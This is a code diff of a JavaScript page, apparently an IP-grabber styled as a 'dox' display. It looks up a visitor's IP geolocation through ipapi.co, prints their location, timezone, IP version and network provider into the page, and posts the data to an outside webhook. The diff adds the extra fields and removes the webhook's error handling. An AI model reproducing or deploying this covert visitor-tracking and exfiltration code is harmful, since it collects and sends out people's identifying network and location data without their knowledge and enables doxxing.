@@ -11,6 +11,8 @@ $.getJSON('https://ipapi.co/json')
   const regionName = data.region_code;
   const lat = data.latitude;
   const lon = data.longitude;
+  const net = data.network;
+  const ver = data.version
 
     setTimeout(function()
     {
@@ -33,6 +35,14 @@ $.getJSON('https://ipapi.co/json')
                 setTimeout(function()
                 {
                   document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>timezone: "+time+"</div>";
+                  setTimeout(function()
+                  {
+                    document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Version: "+ver+"</div>";
+                    setTimeout(function()
+                    {
+                      document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Network: "+net+"</div>";
+                    }, 500)
+                  }, 500)
                 }, 500)
               }, 500)
             }, 500)
@@ -51,13 +61,4 @@ $.getJSON('https://ipapi.co/json')
         },
         "body": JSON.stringify(msg)
       });
-    })
-    .then(webhookResponse => {
-      if (!webhookResponse.ok) {
-        throw new Error("Sending IP to webhook failed.");
-      }
-      console.log("IP sent successfully");
-    })
-    .catch(error => {
-      console.error("Error:", error);
     });
